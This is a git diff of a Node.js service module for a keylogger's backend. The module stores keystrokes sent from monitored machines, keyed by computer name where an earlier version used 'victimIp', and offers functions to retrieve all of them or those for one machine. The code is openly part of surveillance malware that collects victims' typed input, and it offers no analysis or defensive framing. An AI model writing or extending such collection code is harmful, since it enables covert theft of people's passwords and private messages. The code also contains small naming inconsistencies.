@@ -1,13 +1,20 @@
 const keyloggerRepo = require("../repository/keyloggerRepo");
 
 const keyloggerService = {
-    saveKeystrokes = postReq => {
-        keyloggerRepo.saveStrokes(postReq.victimIp, postReq.keystrokes);
+    saveKeystrokes: postReq => {
+        console.log("POST REQUEST: ", postReq);
+        return keyloggerRepo.saveStrokes(postReq.computerName, postReq.keystrokes);
     },
-    getKeyStrokes = () => {
+    getKeyStrokes: () => {
         return keyloggerRepo.getAllStrokes();
     },
-    getKeyStrokesByIp = ipAddr => {
+    getAllStrokes: () => {
+        return keyloggerRepo.retrieveKeyStrokes();
+    },
+    getKeyStrokesByName: ipAddr => {
         return keyloggerRepo.getStrokesByIp(ipAddr);
     }
 };
+
+
+module.exports = keyloggerService;
